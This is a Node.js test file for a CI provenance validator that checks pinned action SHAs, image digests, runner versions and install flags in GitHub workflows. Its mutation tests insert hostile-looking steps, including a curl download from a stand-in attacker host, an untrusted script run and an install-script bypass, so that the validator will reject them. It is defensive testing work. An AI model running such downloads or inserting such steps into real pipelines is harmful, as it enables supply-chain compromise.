import assert from "node:assert/strict";
import { readFile, readdir } from "node:fs/promises";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  parseGitTagAdvertisement,
  resolveActionGitTag,
  validateWorkflowProvenance,
  verifyProvenanceSources,
} from "../../scripts/check-ci-provenance.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const TODAY = "2026-08-15";

async function fixture() {
  const directory = path.join(ROOT, ".github", "workflows");
  const files = (await readdir(directory)).filter((file) => /\.ya?ml$/i.test(file)).sort();
  const workflows = Object.fromEntries(await Promise.all(files.map(async (file) => [
    `.github/workflows/${file}`,
    await readFile(path.join(directory, file), "utf8"),
  ])));
  return {
    workflows,
    policy: JSON.parse(await readFile(path.join(ROOT, "infra", "ci", "provenance-exceptions.json"), "utf8")),
    lock: JSON.parse(await readFile(path.join(ROOT, "infra", "ci", "provenance-lock.json"), "utf8")),
  };
}

function clone(value) {
  return structuredClone(value);
}

function mutateWorkflow(input, file, before, after) {
  const mutated = clone(input);
  assert.ok(mutated.workflows[file].includes(before), `fixture does not contain ${before}`);
  mutated.workflows[file] = mutated.workflows[file].replace(before, after);
  return mutated;
}

function failures(input) {
  return validateWorkflowProvenance({ ...input, today: TODAY });
}

function officialSourceFetch(reviewed) {
  const actionsBySource = new Map(reviewed.lock.actions.map((action) => [action.source, action]));
  const codeqlTagObject = "a".repeat(40);
  return async (url) => {
    const value = String(url);
    if (value.startsWith("https://auth.docker.io/token?")) {
      return new Response(JSON.stringify({ token: "reviewed-registry-token-1234567890" }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    if (value.startsWith("https://registry-1.docker.io/v2/library/")) {
      const match = value.match(/^https:\/\/registry-1\.docker\.io\/v2\/library\/([^/]+)\/manifests\/(.+)$/);
      const image = reviewed.lock.images.find((entry) => entry.reference === `docker.io/library/${match?.[1]}:${match?.[2]}`);
      return new Response(null, {
        status: image ? 200 : 404,
        headers: image ? { "docker-content-digest": image.digest } : {},
      });
    }
    if (value.startsWith("https://mcr.microsoft.com/v2/")) {
      const match = value.match(/^https:\/\/mcr\.microsoft\.com\/v2\/(.+)\/manifests\/(.+)$/);
      const image = reviewed.lock.images.find((entry) => entry.reference === `mcr.microsoft.com/${match?.[1]}:${match?.[2]}`);
      return new Response(null, {
        status: image ? 200 : 404,
        headers: image ? { "docker-content-digest": image.digest } : {},
      });
    }
    if (value === `https://api.github.com/repos/github/codeql-action/git/tags/${codeqlTagObject}`) {
      const action = reviewed.lock.actions.find((entry) => entry.uses.startsWith("github/codeql-action/"));
      return new Response(JSON.stringify({ object: { type: "commit", sha: action.commit_sha } }), { status: 200 });
    }
    if (actionsBySource.has(value)) {
      const action = actionsBySource.get(value);
      const object = action.uses.startsWith("github/codeql-action/")
        ? { type: "tag", sha: codeqlTagObject }
        : { type: "commit", sha: action.commit_sha };
      return new Response(JSON.stringify({ object }), { status: 200 });
    }
    const artifact = reviewed.lock.artifacts.find((entry) => entry.source === value);
    if (artifact) {
      return new Response(`${artifact.sha256}  ${artifact.asset_name}\n`, { status: 200 });
    }
    if (value.startsWith("https://raw.githubusercontent.com/actions/runner-images/")) {
      return new Response("reviewed runner image source\n", { status: 200 });
    }
    return new Response(JSON.stringify({ message: "not found" }), { status: 404 });
  };
}

function officialActionTagResolver(reviewed) {
  const commits = new Map(reviewed.lock.actions.map((action) => {
    const repository = action.uses.split("/").slice(0, 2).join("/");
    return [`${repository}@${action.version}`, action.commit_sha];
  }));
  return async (action) => commits.get(`${action.uses.split("/").slice(0, 2).join("/")}@${action.version}`) || "";
}

function officialArtifactChecksumsResolver(reviewed) {
  const artifacts = new Map(reviewed.lock.artifacts.map((artifact) => [artifact.id, artifact]));
  return async (artifact) => {
    const source = artifacts.get(artifact.id);
    return {
      sourceDigest: source?.source_sha256 || "",
      lines: source ? [`${source.sha256}  ${source.asset_name}`] : [],
    };
  };
}

function packetLine(value) {
  const payload = Buffer.from(value, "utf8");
  return Buffer.concat([Buffer.from((payload.length + 4).toString(16).padStart(4, "0")), payload]);
}

test("Git advertisement parser binds the fixed tag, prefers peeled commits, and rejects ambiguity", async () => {
  const direct = "1".repeat(40);
  const tagObject = "2".repeat(40);
  const peeled = "3".repeat(40);
  const directBytes = Buffer.concat([
    packetLine("# service=git-upload-pack\n"),
    Buffer.from("0000"),
    packetLine(`${direct} refs/tags/v4.4.0\0symref=HEAD:refs/heads/main\n`),
    Buffer.from("0000"),
  ]);
  assert.equal(parseGitTagAdvertisement(directBytes, "actions/checkout", "v4.4.0"), direct);

  const annotatedBytes = Buffer.concat([
    packetLine(`${tagObject} refs/tags/v4.4.0\n`),
    packetLine(`${peeled} refs/tags/v4.4.0^{}\n`),
    Buffer.from("0000"),
  ]);
  assert.equal(parseGitTagAdvertisement(annotatedBytes, "actions/checkout", "v4.4.0"), peeled);
  assert.throws(
    () => parseGitTagAdvertisement(Buffer.concat([annotatedBytes, Buffer.from("x")]), "actions/checkout", "v4.4.0"),
    /trailing bytes/,
  );
  assert.throws(
    () => parseGitTagAdvertisement(Buffer.concat([
      packetLine(`${direct} refs/tags/v4.4.0\n`),
      packetLine(`${direct} refs/tags/v4.4.0\n`),
    ]), "actions/checkout", "v4.4.0"),
    /repeats refs\/tags\/v4\.4\.0/,
  );
  assert.throws(
    () => parseGitTagAdvertisement(Buffer.from("0003"), "actions/checkout", "v4.4.0"),
    /packet is invalid/,
  );

  let requestedUrl = "";
  let requestedOptions;
  const resolved = await resolveActionGitTag(async (url, options) => {
    requestedUrl = String(url);
    requestedOptions = options;
    return new Response(directBytes, { status: 200 });
  }, { uses: "actions/checkout", version: "v4.4.0" });
  assert.equal(resolved, direct);
  assert.equal(requestedUrl, "https://github.com/actions/checkout.git/info/refs?service=git-upload-pack");
  assert.equal(requestedOptions.redirect, "error");
  assert.equal(requestedOptions.headers.Accept, "application/x-git-upload-pack-advertisement");
});

test("current workflows exactly match the reviewed action, image, runner, and installer provenance", async () => {
  const input = await fixture();
  assert.deepEqual(failures(input), []);

  const packageJson = JSON.parse(await readFile(path.join(ROOT, "package.json"), "utf8"));
  assert.equal(packageJson.scripts["check:ci-provenance"], "node scripts/check-ci-provenance.mjs");
  assert.match(packageJson.scripts["check:security"], /npm run check:ci-provenance/);
  assert.match(input.workflows[".github/workflows/ci.yml"], /- name: CI provenance gate\s*\n        run: npm run check:ci-provenance/);
  assert.match(input.workflows[".github/workflows/ci.yml"], /uses: actions\/dependency-review-action@[0-9a-f]{40} # v5\.0\.0/);
  assert.match(input.workflows[".github/workflows/ci.yml"], /uses: github\/codeql-action\/init@[0-9a-f]{40} # v4\.37\.7/);
  assert.match(input.workflows[".github/workflows/ci.yml"], /uses: github\/codeql-action\/analyze@[0-9a-f]{40} # v4\.37\.7/);
  assert.match(
    input.workflows[".github/workflows/ci.yml"],
    /codeql:\s*\n[\s\S]*?permissions:\s*\n\s*contents: read\s*\n\s*security-events: write[\s\S]*?build-mode: none/,
  );
  assert.doesNotMatch(
    input.workflows[".github/workflows/ci.yml"].match(/validate:\s*\n[\s\S]*?(?=^  codeql:)/m)?.[0] || "",
    /security-events: write/,
  );
  assert.doesNotMatch(input.workflows[".github/workflows/ci.yml"], /supabase\/setup-cli@/);
  assert.match(input.workflows[".github/workflows/ci.yml"], /mcr\.microsoft\.com\/playwright:v1\.60\.0-noble@sha256:[0-9a-f]{64}/);
});

test("provenance mutations reject tags, short or unreviewed SHAs, unknown owners, and dishonest comments", async () => {
  const input = await fixture();
  const file = ".github/workflows/ci.yml";
  const pinned = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0";

  assert.match(failures(mutateWorkflow(input, file, pinned, "actions/checkout@v4 # v4.4.0")).join("\n"), /full lowercase 40-character/);
  assert.match(failures(mutateWorkflow(input, file, pinned, "actions/checkout@11d5960 # v4.4.0")).join("\n"), /full lowercase 40-character/);
  assert.match(failures(mutateWorkflow(input, file, pinned, "unknown/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0")).join("\n"), /owner 'unknown' is not trusted/);
  assert.match(failures(mutateWorkflow(input, file, pinned, "actions/checkout@11d5960a326750d5838078e36cf38b85af677262")).join("\n"), /exact version comment/);
  assert.match(failures(mutateWorkflow(input, file, pinned, "actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.3.0")).join("\n"), /does not match the provenance lock/);
  assert.match(failures(mutateWorkflow(input, file, pinned, "actions/checkout@0000000000000000000000000000000000000000 # v4.4.0")).join("\n"), /does not match the provenance lock/);

  const quotedKey = mutateWorkflow(
    input,
    file,
    `uses: ${pinned}`,
    `"uses": unknown/checkout@${"0".repeat(40)} # v4.4.0`,
  );
  assert.match(failures(quotedKey).join("\n"), /owner 'unknown' is not trusted/);

  const localAction = mutateWorkflow(input, file, `uses: ${pinned}`, "uses: ./.github/actions/unreviewed");
  assert.match(failures(localAction).join("\n"), /local actions are forbidden/);

  const escapedKey = mutateWorkflow(
    input,
    file,
    `uses: ${pinned}`,
    `"u\\u0073es": unknown/checkout@main`,
  );
  assert.match(failures(escapedKey).join("\n"), /parsed uses references do not exactly match/);

  const explicitKey = mutateWorkflow(
    input,
    file,
    `uses: ${pinned}`,
    "? uses\n        : unknown/checkout@main",
  );
  assert.match(failures(explicitKey).join("\n"), /parsed uses references do not exactly match/);
});

test("provenance mutations reject tag-only, latest, unknown, variable, or digest-drifted images", async () => {
  const input = await fixture();
  const file = ".github/workflows/ci.yml";
  const postgres = "docker.io/library/postgres:17.11-trixie@sha256:f86c774c7a51d0f05133f2ab70e4c384b589170458ab1df1ba83426d7cc30da7";
  const node = "docker.io/library/node:24.18.0-bookworm@sha256:5711a0d445a1af54af9589066c646df387d1831a608226f4cd694fc59e745059";
  const playwright = "mcr.microsoft.com/playwright:v1.60.0-noble@sha256:9bd26ad900bb5e0f4dee75839e957a89ae89c2b7ab1e76050e559790e946b948";

  assert.match(failures(mutateWorkflow(input, file, postgres, "docker.io/library/postgres:17.11-trixie")).join("\n"), /explicit tag plus sha256/);
  assert.match(failures(mutateWorkflow(input, file, postgres, `docker.io/library/postgres:17.11-trixie@sha256:${"0".repeat(64)}`)).join("\n"), /digest does not match/);
  assert.match(failures(mutateWorkflow(input, file, postgres, `docker.io/library/postgres:latest@sha256:${"0".repeat(64)}`)).join("\n"), /tag may not contain latest/);
  assert.match(failures(mutateWorkflow(input, file, postgres, `docker.io/acme/postgres:17.11@sha256:${"0".repeat(64)}`)).join("\n"), /absent from the provenance lock/);
  assert.match(failures(mutateWorkflow(input, file, node, "$CONTROL_PLANE_IMAGE")).join("\n"), /image must use an explicit tag plus sha256 digest/);
  assert.match(failures(mutateWorkflow(input, file, playwright, `mcr.microsoft.com/playwright:v1.60.0-noble@sha256:${"0".repeat(64)}`)).join("\n"), /digest does not match/);
});

test("provenance mutations reject latest runners, dynamic npm execution, and unversioned apt", async () => {
  const input = await fixture();
  const ci = ".github/workflows/ci.yml";
  const testCi = ".github/workflows/test-ci.yml";

  assert.match(failures(mutateWorkflow(input, ci, "runs-on: ubuntu-24.04", "runs-on: ubuntu-latest")).join("\n"), /\*-latest alias/);
  const smoke = "npm exec --offline -- playwright test --config=playwright.production-smoke.config.ts";
  assert.match(failures(mutateWorkflow(input, ci, smoke, `npx playwright install chromium\n        run: ${smoke}`)).join("\n"), /npx is forbidden/);
  assert.match(failures(mutateWorkflow(input, ci, smoke, "npm exec -- playwright install chromium")).join("\n"), /npm exec must use --offline/);
  assert.match(failures(mutateWorkflow(input, ci, smoke, "npm exec --offline -- playwright install chromium")).join("\n"), /browser downloads are forbidden/);
  assert.match(failures(mutateWorkflow(input, testCi, "run: echo ok", "run: sudo apt-get install curl")).join("\n"), /must pin an exact version/);

  const missingToolchain = mutateWorkflow(input, ci, "run: node scripts/check-toolchain.mjs", "run: node --version");
  assert.match(failures(missingToolchain).join("\n"), /npm ci must follow setup-node and the pre-install toolchain gate/);

  const weakInstall = mutateWorkflow(input, ci, "--strict-allow-scripts=true --include=optional", "--include=optional");
  assert.match(failures(weakInstall).join("\n"), /must force --strict-allow-scripts=true/);

  const omittedOptional = mutateWorkflow(input, ci, " --include=optional", "");
  assert.match(failures(omittedOptional).join("\n"), /must force --include=optional/);

  const mirrorInstall = mutateWorkflow(input, ci, "--registry=https://registry.npmjs.org", "--registry=https://registry.npmmirror.com");
  assert.match(failures(mirrorInstall).join("\n"), /must force the official npm registry/);

  const bypassedInstall = mutateWorkflow(
    input,
    ci,
    "--strict-allow-scripts=true --include=optional",
    "--strict-allow-scripts=true --dangerously-allow-all-scripts --include=optional",
  );
  assert.match(failures(bypassedInstall).join("\n"), /may not bypass reviewed install scripts/);

  const pinnedApt = mutateWorkflow(input, testCi, "run: echo ok", "run: sudo apt-get install curl=8.5.0-2ubuntu10.6");
  assert.deepEqual(failures(pinnedApt), []);
});

test("checkout credentials, CodeQL permissions, and downloaded release artifacts fail closed", async () => {
  const input = await fixture();
  const ci = ".github/workflows/ci.yml";
  assert.match(
    failures(mutateWorkflow(input, ci, "persist-credentials: false", "persist-credentials: true")).join("\n"),
    /checkout must set persist-credentials: false/,
  );
  assert.match(
    failures(mutateWorkflow(input, ci, "      - name: Initialize isolated CodeQL analysis", "      - run: node untrusted.mjs\n      - name: Initialize isolated CodeQL analysis")).join("\n"),
    /security-events write jobs may not execute repository commands/,
  );
  assert.match(
    failures(mutateWorkflow(input, ci, "    name: CodeQL analysis", "    name: CodeQL analysis\n    needs: validate")).join("\n"),
    /must not declare needs/,
  );
  assert.match(
    failures(mutateWorkflow(input, ci, "    name: CodeQL analysis", "    name: CodeQL analysis\n    if: false")).join("\n"),
    /security-events write jobs may not be conditionally skipped/,
  );
  assert.match(
    failures(mutateWorkflow(
      input,
      ci,
      "        if: ${{ github.event_name == 'pull_request' }}",
      "        if: false",
    )).join("\n"),
    /dependency review must use the exact pull_request condition/,
  );
  const dependencyReview = "uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0";
  assert.match(
    failures(mutateWorkflow(input, ci, dependencyReview, `${dependencyReview}\n        continue-on-error: true`)).join("\n"),
    /may not declare continue-on-error/,
  );
  const codeqlAnalyze = "uses: github/codeql-action/analyze@ff2f1c621b7f889edc0d3c761ac2e6a3f8cdb0dd # v4.37.7";
  assert.match(
    failures(mutateWorkflow(input, ci, codeqlAnalyze, `${codeqlAnalyze}\n        continue-on-error: true`)).join("\n"),
    /may not declare continue-on-error/,
  );
  const artifact = input.lock.artifacts[0];
  assert.match(
    failures(mutateWorkflow(input, ci, `node scripts/install-reviewed-artifact.mjs ${artifact.id}`, "node scripts/install-reviewed-artifact.mjs unreviewed")).join("\n"),
    /installer invocation is not exact/,
  );
  assert.match(
    failures(mutateWorkflow(
      input,
      ci,
      `node scripts/install-reviewed-artifact.mjs ${artifact.id}`,
      `node scripts/install-reviewed-artifact.mjs ${artifact.id}\n          curl --output "$RUNNER_TEMP/unsafe" https://attacker.invalid/archive`,
    )).join("\n"),
    /network download is not bound to a reviewed artifact/,
  );
});

test("runner exceptions and provenance lock entries fail closed when expired, overlong, missing, stale, or altered", async () => {
  const input = await fixture();

  const expired = clone(input);
  expired.policy.exceptions[0].expires = "2026-08-14";
  assert.match(failures(expired).join("\n"), /expired or invalid/);

  const invalidDate = clone(input);
  invalidDate.policy.exceptions[0].expires = "2026-02-31";
  assert.match(failures(invalidDate).join("\n"), /expired or invalid/);

  const overlong = clone(input);
  overlong.policy.exceptions[0].expires = "2027-08-15";
  assert.match(failures(overlong).join("\n"), /45-day maximum/);

  const missing = clone(input);
  missing.policy.exceptions = missing.policy.exceptions.filter((entry) => entry.subject !== "windows-2025");
  assert.match(failures(missing).join("\n"), /windows-2025.*lacks an active exception/);

  const stale = clone(input);
  stale.policy.exceptions.push({ ...stale.policy.exceptions[0], id: "unused-v1", subject: "ubuntu-22.04" });
  assert.match(failures(stale).join("\n"), /stale provenance exception for unused runner 'ubuntu-22.04'/);

  const driftedLock = clone(input);
  driftedLock.lock.images[0].digest = `sha256:${"0".repeat(64)}`;
  assert.match(failures(driftedLock).join("\n"), /image digest does not match the provenance lock/);

  const dishonestSource = clone(input);
  dishonestSource.lock.actions[0].source = "https://api.github.com/repos/actions/checkout/git/ref/tags/v4.3.0";
  assert.match(failures(dishonestSource).join("\n"), /source must be the official GitHub tag-ref API/);

  const staleLock = clone(input);
  staleLock.lock.actions.push({
    uses: "actions/cache",
    version: "v4.0.0",
    commit_sha: "0".repeat(40),
    source: "https://api.github.com/repos/actions/cache/git/ref/tags/v4.0.0",
  });
  assert.match(failures(staleLock).join("\n"), /stale provenance lock action 'actions\/cache'/);

  const staleArtifact = clone(input);
  staleArtifact.lock.artifacts.push({ ...staleArtifact.lock.artifacts[0], id: "duplicate", url: `${staleArtifact.lock.artifacts[0].url}.unused` });
  assert.notDeepEqual(failures(staleArtifact), []);
});

test("official online readback binds every claimed action tag, image tag, and runner reference", async () => {
  const input = await fixture();
  const fetchImpl = officialSourceFetch(input);
  const actionTagResolver = officialActionTagResolver(input);
  const artifactChecksumsResolver = officialArtifactChecksumsResolver(input);
  const runnerAuditResolver = async () => {};
  const resolvers = { fetchImpl, actionTagResolver, artifactChecksumsResolver, runnerAuditResolver };
  assert.deepEqual(await verifyProvenanceSources({ policy: input.policy, lock: input.lock, ...resolvers }), []);

  const dishonestAction = clone(input.lock);
  dishonestAction.actions[0].commit_sha = "0".repeat(40);
  assert.match(
    (await verifyProvenanceSources({ policy: input.policy, lock: dishonestAction, ...resolvers })).join("\n"),
    /official tag resolves to .* not the locked commit/,
  );

  const dishonestImage = clone(input.lock);
  dishonestImage.images[0].digest = `sha256:${"0".repeat(64)}`;
  assert.match(
    (await verifyProvenanceSources({ policy: input.policy, lock: dishonestImage, ...resolvers })).join("\n"),
    /official tag resolves to .* not the locked digest/,
  );

  const dishonestArtifact = clone(input.lock);
  dishonestArtifact.artifacts[0].sha256 = "0".repeat(64);
  assert.match(
    (await verifyProvenanceSources({ policy: input.policy, lock: dishonestArtifact, ...resolvers })).join("\n"),
    /official checksums do not match/,
  );

  const offline = async () => { throw new Error("offline"); };
  assert.match(
    (await verifyProvenanceSources({
      policy: input.policy,
      lock: input.lock,
      fetchImpl: offline,
      dockerDigestResolver: async () => { throw new Error("offline"); },
      actionTagResolver: async () => { throw new Error("offline"); },
      artifactChecksumsResolver: async () => { throw new Error("offline"); },
      runnerAuditResolver: async () => { throw new Error("offline"); },
    })).join("\n"),
    /could not be fetched/,
  );

  const officialFetch = officialSourceFetch(input);
  let transientRunnerAttempts = 0;
  const transientFetch = async (url, options) => {
    if (String(url).includes("raw.githubusercontent.com/actions/runner-images/")) {
      transientRunnerAttempts += 1;
      if (transientRunnerAttempts === 1) throw new Error("transient network failure");
      if (transientRunnerAttempts === 2) return new Response("temporary upstream failure", { status: 502 });
    }
    return officialFetch(url, options);
  };
  assert.deepEqual(
    await verifyProvenanceSources({
      policy: input.policy,
      lock: input.lock,
      fetchImpl: transientFetch,
      actionTagResolver,
      artifactChecksumsResolver,
    }),
    [],
  );
  assert.equal(transientRunnerAttempts, 4, "network and HTTP retries plus the second runner reference must be fetched");
});
